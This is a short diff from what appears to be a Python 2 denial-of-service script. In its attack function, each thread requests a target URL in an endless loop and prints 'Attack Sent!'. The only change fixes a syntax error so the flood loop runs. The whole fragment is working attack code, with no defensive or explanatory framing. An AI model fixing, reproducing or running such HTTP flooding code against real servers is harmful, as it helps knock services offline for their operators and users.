@@ -49,7 +49,7 @@ def attack(ip, port, threadNum):
     request = urllib2.Request(url,None,headers)
     while True:
         try:
-            urlsocket file = urllib2.urlopen(request)
+            urlsocket_file = urllib2.urlopen(request)
             print "[*] Thread (%s) | Attack Sent!" % (threadNum)
         except:
             print "[*] Thread (%s) | URL or IP not valid!" % (threadNum)
